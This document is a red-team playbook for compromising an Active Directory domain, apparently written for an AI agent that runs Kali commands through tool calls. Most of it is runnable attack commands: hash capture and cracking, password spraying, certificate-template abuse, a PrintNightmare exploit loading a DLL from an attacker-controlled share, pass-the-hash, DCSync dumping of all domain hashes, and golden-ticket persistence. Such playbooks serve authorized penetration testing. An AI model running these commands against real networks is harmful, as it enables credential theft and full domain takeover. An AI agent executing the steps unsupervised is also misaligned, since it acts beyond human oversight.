# PLAYBOOK: Active Directory Attack
# April 2026 Red Team Stack
# Internal engagement — domain compromise path

---

## AD Attack Path Overview

```
External Foothold / Internal VPN Access
         │
         ▼
    Host Discovery
    Service Enum (445, 389, 88, 5985)
         │
         ▼
    Kerberoasting / AS-REP Roasting      ← No credentials needed for AS-REP
    LLMNR/NBT-NS Poisoning (Responder)
         │
         ▼
    First Domain Credential
         │
    ┌────┴────────────────────┐
    ▼                         ▼
BloodHound Mapping         Password Spray
Find Paths to DA           (Smart — 1 attempt per lockout threshold)
    │                         │
    └────────┬────────────────┘
             ▼
    High-Value Targets
    (DA, Exchange, PKI, ADCS)
             │
             ▼
    DCSync / Golden Ticket / ADCS ESC1
             │
             ▼
    Domain Compromise
```

---

## PHASE 1 — PLANNING (PentestThinkingMCP)

```
Authorized AD penetration test against [DOMAIN] ([DOMAIN_CONTROLLER_IP]).
Access: [internal VPN / direct / foothold from external].
Known info: [any credentials, shares, or hosts already found].

Using PentestThinkingMCP, plan the AD attack path.
Focus: credential acquisition → privilege escalation → domain admin.
```

---

## PHASE 2 — INITIAL ENUMERATION (No Creds)

**Domain Controller discovery:**
```
Using hexstrike-ai / Kali MCP:
# Find DCs via DNS
nslookup -type=srv _ldap._tcp.[DOMAIN]
nmap -p 88,389,445,3268 [RANGE] --open

# Or via broadcast
kali_exec("nbtscan [RANGE]")
```

**SMB null/guest session:**
```
kali_exec("crackmapexec smb [DC_IP] -u '' -p ''")
kali_exec("crackmapexec smb [DC_IP] -u 'guest' -p ''")
kali_exec("smbclient -L //[DC_IP]/ -N")
```

**LDAP anonymous bind:**
```
kali_exec("ldapsearch -x -H ldap://[DC_IP] -b '' -s base 2>/dev/null")
kali_exec("ldapsearch -x -H ldap://[DC_IP] -b 'DC=[DOMAIN_PART1],DC=[DOMAIN_PART2]' '(objectClass=*)' 2>/dev/null | head -100")
```

**Kerbrute — username enumeration (no lockout):**
```
kali_exec("kerbrute userenum -d [DOMAIN] --dc [DC_IP] /usr/share/seclists/Usernames/Names/names.txt")
```

---

## PHASE 3 — CREDENTIAL ACQUISITION

### Option A — Responder (LLMNR/NBT-NS Poisoning)
```
# Works on same network segment
kali_tmux_new("responder")
kali_tmux_send("responder", "responder -I eth0 -rdwv 2>&1")
# Wait for NTLMv2 hashes to roll in
# Crack with hashcat:
kali_exec("hashcat -m 5600 loot/[MISSION]/ntlmv2.txt /usr/share/wordlists/rockyou.txt --force")
```

### Option B — AS-REP Roasting (no creds required)
```
# Get users who don't require Kerberos pre-auth
kali_exec("impacket-GetNPUsers [DOMAIN]/ -usersfile users.txt -no-pass -dc-ip [DC_IP] -outputfile loot/[MISSION]/asrep_hashes.txt")

# Crack with hashcat:
kali_exec("hashcat -m 18200 loot/[MISSION]/asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force")
```

### Option C — Kerberoasting (needs any valid user)
```
kali_exec("impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request -outputfile loot/[MISSION]/kerb_hashes.txt")

# Crack:
kali_exec("hashcat -m 13100 loot/[MISSION]/kerb_hashes.txt /usr/share/wordlists/rockyou.txt --force")
```

### Option D — Password Spray (careful — lockout risk)
```
# CHECK LOCKOUT POLICY FIRST:
kali_exec("crackmapexec smb [DC_IP] -u [ANY_USER] -p [ANY_PASS] --pass-pol")

# Spray — ONE attempt per user, wait between rounds
kali_exec("crackmapexec smb [DC_IP] -u users.txt -p 'Password1' --continue-on-success")
kali_exec("crackmapexec smb [DC_IP] -u users.txt -p '[COMPANY][YEAR]!' --continue-on-success")
kali_exec("crackmapexec smb [DC_IP] -u users.txt -p 'Welcome1' --continue-on-success")
```

---

## PHASE 4 — BLOODHOUND MAPPING

**Collect from domain (with valid creds):**
```
kali_exec("""
bloodhound-python \
  -u [USER] -p [PASS] \
  -d [DOMAIN] -ns [DC_IP] \
  -c All \
  --zip \
  -o loot/[MISSION]/bloodhound/
""")
```

**Import and query:**
- Import ZIP to BloodHound GUI
- Run "Find Shortest Paths to Domain Admins"
- Run "Find Principals with DCSync Rights"
- Run "Find Kerberoastable Users with DA paths"
- Custom: `MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@[DOMAIN]'}) RETURN u.name`

---

## PHASE 5 — HIGH-VALUE EXPLOITS

### ACL Abuse (GenericAll / WriteDACL / ForceChangePassword)
```
# If BloodHound shows ACL path:
kali_exec("bloodyAD --host [DC_IP] -d [DOMAIN] -u [USER] -p [PASS] set password [TARGET_USER] 'NewPass123!'")
```

### ADCS — ESC1 (Certificate Services Privilege Escalation)
```
# Find vulnerable certificate templates
kali_exec("certipy find -u [USER]@[DOMAIN] -p [PASS] -dc-ip [DC_IP] -stdout")

# ESC1: Request cert as DA
kali_exec("certipy req -u [USER]@[DOMAIN] -p [PASS] -dc-ip [DC_IP] -ca [CA_NAME] -template [VULN_TEMPLATE] -upn administrator@[DOMAIN]")

# Authenticate with cert → get DA NTLM hash
kali_exec("certipy auth -pfx administrator.pfx -dc-ip [DC_IP]")
```

### PrintNightmare / SpoolSample (Printer Bug)
```
kali_exec("impacket-rpcdump [DC_IP] | grep -i 'spoolss\|print'")
# If spooler running + no patches:
kali_exec("python3 CVE-2021-1675.py [DOMAIN]/[USER]:[PASS]@[DC_IP] '\\\\[ATTACKER_IP]\\share\\malicious.dll'")
```

### Pass-the-Hash / Pass-the-Ticket
```
# PtH with NTLM hash
kali_exec("crackmapexec smb [RANGE] -u administrator -H [NTLM_HASH] --local-auth")
kali_exec("impacket-psexec -hashes :[NTLM_HASH] administrator@[TARGET_IP]")

# PtT with Kerberos ticket
kali_exec("impacket-getTGT [DOMAIN]/[USER] -hashes :[NTLM_HASH]")
kali_exec("export KRB5CCNAME=[USER].ccache")
kali_exec("impacket-psexec -k -no-pass [DOMAIN]/administrator@[DC_FQDN]")
```

---

## PHASE 6 — DOMAIN COMPROMISE

### DCSync (requires DA or DCSync rights)
```
kali_exec("""
impacket-secretsdump \
  -just-dc [DOMAIN]/[DA_USER]:[DA_PASS]@[DC_IP] \
  -outputfile loot/[MISSION]/dcsync
""")
# This dumps ALL domain hashes — handle with extreme care
```

### Golden Ticket (krbtgt hash → permanent persistence)
```
# Get krbtgt hash from DCSync output
# Create Golden Ticket:
kali_exec("""
impacket-ticketer \
  -nthash [KRBTGT_HASH] \
  -domain-sid [DOMAIN_SID] \
  -domain [DOMAIN] \
  -groups 512 \
  administrator
""")
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@[DC_FQDN]
```

---

## AD Quick Reference

```bash
# Enumerate users (with creds)
crackmapexec smb [DC_IP] -u [USER] -p [PASS] --users

# Enumerate groups
crackmapexec smb [DC_IP] -u [USER] -p [PASS] --groups

# Check local admin access across range
crackmapexec smb [RANGE] -u [USER] -p [PASS] --local-auth

# WinRM access check
crackmapexec winrm [RANGE] -u [USER] -p [PASS]

# Evil-WinRM interactive shell
evil-winrm -i [TARGET_IP] -u [USER] -p [PASS]

# Extract secrets from target
crackmapexec smb [TARGET_IP] -u [USER] -p [PASS] --sam  # Local SAM
crackmapexec smb [TARGET_IP] -u [USER] -p [PASS] --lsa  # LSA secrets

# PowerView equivalents via crackmapexec
crackmapexec smb [DC_IP] -u [USER] -p [PASS] -M find_delegation
```

---

*April 2026 | AD testing — authorized internal engagement only*
